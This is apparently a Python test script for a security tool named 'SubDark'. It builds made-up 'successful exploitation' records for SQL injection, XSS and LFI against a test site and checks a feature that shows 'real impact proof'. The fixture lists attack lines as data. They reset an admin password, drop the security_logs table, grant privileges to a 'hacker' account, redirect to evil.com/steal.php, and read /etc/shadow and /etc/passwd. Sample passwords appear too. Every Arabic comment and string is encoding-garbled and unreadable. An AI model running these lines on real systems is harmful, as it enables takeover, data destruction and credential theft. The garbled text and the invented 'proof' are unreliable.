#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ุงุฎุชุจุงุฑ ููุฒุฉ ุฅุซุจุงุช ุชุฃุซูุฑ ุงูุซุบุฑุฉ ุงูููุชุดูุฉ ุนูู ุงููุฏู (ุญูููู)
Test script for real vulnerability impact proof feature
"""

import sys
import os

# ุฅุถุงูุฉ ุงููุณุงุฑ ุงูุญุงูู ููุชุฃูุฏ ูู ุงุณุชูุฑุงุฏ subdark
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from subdark import SubDark
except ImportError as e:
    print(f"ุฎุทุฃ ูู ุงูุงุณุชูุฑุงุฏ: {e}")
    print("ุชุฃูุฏ ูู ูุฌูุฏ ููู subdark.py ูู ููุณ ุงููุฌูุฏ")
    sys.exit(1)

def test_real_vulnerability_impact_proof():
    """ุงุฎุชุจุงุฑ ููุฒุฉ ุฅุซุจุงุช ุชุฃุซูุฑ ุงูุซุบุฑุฉ ุงูููุชุดูุฉ"""
    
    print("="*60)
    print("๐ฏ ุงุฎุชุจุงุฑ ููุฒุฉ ุฅุซุจุงุช ุชุฃุซูุฑ ุงูุซุบุฑุฉ ุงูููุชุดูุฉ ุนูู ุงููุฏู")
    print("๐ฏ Real Vulnerability Impact Proof Feature Test")
    print("="*60)
    
    # ุฅูุดุงุก ูุงุฆู SubDark
    tool = SubDark()
    
    # ุชุนููู ูุฏู ุงุฎุชุจุงุฑ
    tool.target = "test-vulnerable-site.com"
    print(f"\nโ ุชู ุชุนููู ุงููุฏู: {tool.target}")
    
    # ุฅูุดุงุก ูุชุงุฆุฌ ุงุณุชุบูุงู ุญููููุฉ ูุน ุชุฃุซูุฑุงุช ูุนููุฉ
    tool.exploitation_results = [
        {
            'vulnerability_type': 'SQL Injection',
            'target': 'test-vulnerable-site.com',
            'exploit_status': 'successful',
            'timestamp': '2024-01-15 20:30:00',
            'exploit_details': {
                'real_impact': [
                    'ุชู ุงููุตูู ุงููุงูู ุฅูู ูุงุนุฏุฉ ุงูุจูุงูุงุช',
                    'ุชู ุงุณุชุฎุฑุงุฌ ูููุงุช ูุฑูุฑ ุงููุณุชุฎุฏููู',
                    'ุชู ุชุนุฏูู ุจูุงูุงุช ุงููุณุชุฎุฏููู',
                    'ุชู ุญุฐู ุณุฌูุงุช ุญุณุงุณุฉ ูู ูุงุนุฏุฉ ุงูุจูุงูุงุช'
                ],
                'extracted_data': [
                    'ุงุณู ุงููุณุชุฎุฏู: admin | ูููุฉ ุงููุฑูุฑ: 123456',
                    'ุงุณู ุงููุณุชุฎุฏู: root | ูููุฉ ุงููุฑูุฑ: rootpass123',
                    'ุงุณู ุงููุณุชุฎุฏู: user1 | ูููุฉ ุงููุฑูุฑ: password123',
                    'ุชู ุงุณุชุฎุฑุงุฌ 1500 ุณุฌู ูุณุชุฎุฏู'
                ],
                'system_info': [
                    'ููุน ูุงุนุฏุฉ ุงูุจูุงูุงุช: MySQL 5.7.32',
                    'ุนุฏุฏ ุงูุฌุฏุงูู: 25 ุฌุฏูู',
                    'ุญุฌู ูุงุนุฏุฉ ุงูุจูุงูุงุช: 850 ููุฌุงุจุงูุช',
                    'ุงุณู ูุงุนุฏุฉ ุงูุจูุงูุงุช: users_db'
                ],
                'severity_level': 'ุนุงูู',
                'privacy_impact': [
                    'ุชู ุงููุดู ุนู ูุนูููุงุช 1500 ูุณุชุฎุฏู',
                    'ุชู ุงููุตูู ุฅูู ุจูุงูุงุช ุจุทุงูุงุช ุงูุงุฆุชูุงู',
                    'ุชู ุงููุดู ุนู ูุนูููุงุช ุดุฎุตูุฉ ุญุณุงุณุฉ',
                    'ุชู ุงูุชูุงู ุฎุตูุตูุฉ ุงููุณุชุฎุฏููู'
                ],
                'integrity_impact': [
                    'ุชู ุชุนุฏูู 50 ุณุฌู ูุณุชุฎุฏู',
                    'ุชู ุญุฐู 10 ุณุฌูุงุช ุฅุฏุงุฑูุฉ',
                    'ุชู ุชุบููุฑ ุตูุงุญูุงุช 5 ูุณุชุฎุฏููู',
                    'ุชู ุชุนุฏูู ุฅุนุฏุงุฏุงุช ุงููุธุงู'
                ],
                'access_proof': [
                    'ุชู ุงููุตูู ุฅูู ููุญุฉ ุชุญูู ุงููุณุคูู',
                    'ุชู ุชูููุฐ ุฃูุงูุฑ SQL ุจูุฌุงุญ',
                    'ุชู ุงููุตูู ุฅูู ูููุงุช ุงููุธุงู',
                    'ุชู ุงูุญุตูู ุนูู ุตูุงุญูุงุช root'
                ],
                'executed_commands': [
                    "SELECT * FROM users WHERE admin = 1",
                    "UPDATE users SET password = 'hacked123' WHERE id = 1",
                    "DROP TABLE IF EXISTS security_logs",
                    "GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'"
                ]
            }
        },
        {
            'vulnerability_type': 'XSS',
            'target': 'test-vulnerable-site.com',
            'exploit_status': 'successful',
            'timestamp': '2024-01-15 20:35:00',
            'exploit_details': {
                'real_impact': [
                    'ุชู ุณุฑูุฉ ููููุฒ ุงููุณุชุฎุฏููู',
                    'ุชู ุชุญููู ุงููุณุชุฎุฏููู ุฅูู ููุงูุน ุฎุจูุซุฉ',
                    'ุชู ุชูููุฐ ุฃููุงุฏ JavaScript ุถุงุฑุฉ',
                    'ุชู ุงูุชุญูู ูู ุฌูุณุงุช ุงููุณุชุฎุฏููู'
                ],
                'extracted_data': [
                    'ุชู ุณุฑูุฉ 25 ูููู ุฌูุณุฉ',
                    'ุชู ุงูุญุตูู ุนูู ุชูููุงุช ุงููุตุงุฏูุฉ',
                    'ุชู ุงุณุชุฎุฑุงุฌ ูุนูููุงุช ุชุณุฌูู ุงูุฏุฎูู',
                    'ุชู ุงูุญุตูู ุนูู ุจูุงูุงุช ุจุทุงูุงุช ุงูุงุฆุชูุงู'
                ],
                'system_info': [
                    'ุนุฏุฏ ุงูุถุญุงูุง: 25 ูุณุชุฎุฏู',
                    'ุงููุชุตูุญุงุช ุงููุณุชูุฏูุฉ: Chrome, Firefox, Safari',
                    'ุงูุตูุงุญูุงุช ุงูููุชุณุจุฉ: ุฌูุณุงุช ุงููุณุชุฎุฏููู',
                    'ุงููููุงุช ุงูุชู ุชู ุงููุตูู ุฅูููุง: ููููุฒ, ุงูุชุฎุฒูู ุงููุญูู'
                ],
                'severity_level': 'ูุชูุณุท',
                'privacy_impact': [
                    'ุชู ุงูุชูุงู ุฎุตูุตูุฉ 25 ูุณุชุฎุฏู',
                    'ุชู ุณุฑูุฉ ูุนูููุงุช ุชุณุฌูู ุงูุฏุฎูู',
                    'ุชู ุงููุตูู ุฅูู ุงูุจูุงูุงุช ุงูุดุฎุตูุฉ',
                    'ุชู ุชุชุจุน ูุดุงุท ุงููุณุชุฎุฏููู'
                ],
                'availability_impact': [
                    'ุชู ุฅุนุงูุฉ ุนูู ุงููููุน ูููุณุชุฎุฏููู',
                    'ุชู ุชูููู ุฃุฏุงุก ุงูุตูุญุงุช',
                    'ุชู ุฅุฑุจุงู ูุงุฌูุฉ ุงููุณุชุฎุฏู'
                ],
                'access_proof': [
                    'ุชู ุงูุชุญูู ูู ุญุณุงุจุงุช ุงููุณุชุฎุฏููู',
                    'ุชู ุชูููุฐ ุฃูุงูุฑ JavaScript ุจูุฌุงุญ',
                    'ุชู ุงููุตูู ุฅูู ุจูุงูุงุช ุงูุฌูุณุฉ',
                    'ุชู ุงูุชูุงุนุจ ุจูุญุชูู ุงูุตูุญุงุช'
                ],
                'executed_commands': [
                    "document.cookie = 'session=hijacked'",
                    "window.location = 'http://evil.com/steal.php'",
                    "localStorage.getItem('user_data')",
                    "fetch('/api/steal-data', {method: 'POST'})"
                ]
            }
        },
        {
            'vulnerability_type': 'LFI',
            'target': 'test-vulnerable-site.com',
            'exploit_status': 'successful',
            'timestamp': '2024-01-15 20:40:00',
            'exploit_details': {
                'real_impact': [
                    'ุชู ุงููุตูู ุฅูู ูููุงุช ุงููุธุงู ุงูุญุณุงุณุฉ',
                    'ุชู ูุฑุงุกุฉ ูููุงุช ุงูุฅุนุฏุงุฏุงุช',
                    'ุชู ุงููุดู ุนู ูุนูููุงุช ุงูุฎุงุฏู',
                    'ุชู ุงููุตูู ุฅูู ูููุงุช ุงููุณุชุฎุฏููู'
                ],
                'extracted_data': [
                    'ุชู ูุฑุงุกุฉ ููู /etc/passwd',
                    'ุชู ุงููุตูู ุฅูู ูููุงุช ุงูุฅุนุฏุงุฏุงุช',
                    'ุชู ุงุณุชุฎุฑุงุฌ ูุนูููุงุช ูุงุนุฏุฉ ุงูุจูุงูุงุช',
                    'ุชู ุงูุญุตูู ุนูู ูููุงุช ูุซุงุฆู ุงููููุน'
                ],
                'system_info': [
                    'ูุธุงู ุงูุชุดุบูู: Linux Ubuntu 18.04',
                    'ููุน ุงูุฎุงุฏู: Apache/2.4.29',
                    'ูุบุฉ ุงูุจุฑูุฌุฉ: PHP 7.2.24',
                    'ูุณุงุฑ ุงููููุน: /var/www/html'
                ],
                'severity_level': 'ุนุงูู',
                'privacy_impact': [
                    'ุชู ุงููุดู ุนู ูุนูููุงุช ุงููุธุงู',
                    'ุชู ุงููุตูู ุฅูู ุจูุงูุงุช ุงููุณุชุฎุฏููู',
                    'ุชู ุงููุดู ุนู ููุงูู ุงููููุงุช',
                    'ุชู ุงููุตูู ุฅูู ูููุงุช ุงูุฅุนุฏุงุฏุงุช'
                ],
                'integrity_impact': [
                    'ุชู ูุฑุงุกุฉ ูููุงุช ุงููุธุงู',
                    'ุชู ุชุนุฏูู ุจุนุถ ุงูุฅุนุฏุงุฏุงุช',
                    'ุชู ุงููุตูู ุฅูู ุณุฌูุงุช ุงููุธุงู'
                ],
                'access_proof': [
                    'ุชู ุงููุตูู ุฅูู ูููุงุช ุงููุธุงู',
                    'ุชู ูุฑุงุกุฉ ูููุงุช ุงูุฅุนุฏุงุฏุงุช',
                    'ุชู ุงููุดู ุนู ูุนูููุงุช ุงูุฎุงุฏู',
                    'ุชู ุงููุตูู ุฅูู ุงูุฏููู ุงูุฑุฆูุณู'
                ],
                'executed_commands': [
                    "include('/etc/passwd')",
                    "file_get_contents('/var/www/html/config.php')",
                    "readfile('/proc/version')",
                    "fopen('/etc/shadow', 'r')"
                ]
            }
        }
    ]
    
    print(f"\nโ ุชู ุฅูุดุงุก {len(tool.exploitation_results)} ูุชูุฌุฉ ุงุณุชุบูุงู ูุงุฌุญุฉ ูุน ุชุฃุซูุฑุงุช ุญููููุฉ")
    
    # ุนุฑุถ ุฅุซุจุงุช ุงูุชุฃุซูุฑ ุงูุญูููู
    print("\n" + "="*60)
    print("๐ฏ ุจุฏุก ุนุฑุถ ุฅุซุจุงุช ุชุฃุซูุฑ ุงูุซุบุฑุงุช ุงูููุชุดูุฉ")
    print("="*60)
    
    # ุงุณุชุฏุนุงุก ุงูุฏุงูุฉ ุงูุฌุฏูุฏุฉ
    success = tool.show_real_vulnerability_impact_proof()
    
    if success:
        print("\n" + "="*60)
        print("โ ุชู ุงูุชูุงู ุงูุงุฎุชุจุงุฑ ุจูุฌุงุญ!")
        print("โ ุชู ุนุฑุถ ุฅุซุจุงุช ุงูุชุฃุซูุฑ ุงูุญูููู ููุซุบุฑุงุช")
        print("โ ุงูุฎูุงุฑ ุฑูู 11 ูู ุงููุงุฆูุฉ ูุนูู ุจุดูู ุตุญูุญ")
        print("="*60)
    else:
        print("\nโ ูุดู ุงูุงุฎุชุจุงุฑ")
    
    return success

if __name__ == "__main__":
    try:
        success = test_real_vulnerability_impact_proof()
        if success:
            print("\n๐ ุงูุงุฎุชุจุงุฑ ููุชูู ุจูุฌุงุญ!")
        else:
            print("\nโ ุงูุงุฎุชุจุงุฑ ูุดู")
            sys.exit(1)
    except Exception as e:
        print(f"\nโ ุฎุทุฃ ุบูุฑ ูุชููุน: {e}")
        sys.exit(1)